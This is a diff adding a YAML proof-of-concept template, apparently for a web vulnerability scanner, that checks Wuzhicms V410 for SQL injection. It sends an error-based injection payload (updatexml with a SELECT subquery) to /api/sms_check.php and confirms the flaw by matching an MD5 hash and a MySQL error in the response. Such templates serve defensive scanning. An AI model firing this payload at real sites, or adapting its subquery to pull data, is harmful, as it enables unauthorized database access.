@@ -1,0 +1,22 @@
+id: poc-yaml-wuzhicms-v410-sqli
+info:
+  name: Wuzhicms V410 SQL注入漏洞
+  severity: medium
+  tags:
+  - sql-injection
+  finger: Wuzhicms
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20MD5(1234)),0x7e),1)--%20
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "81dc9bdb52d04dc20036dbd8313ed05")
+    && contains(body, "sql_error:MySQL Query Error")
+  output: []
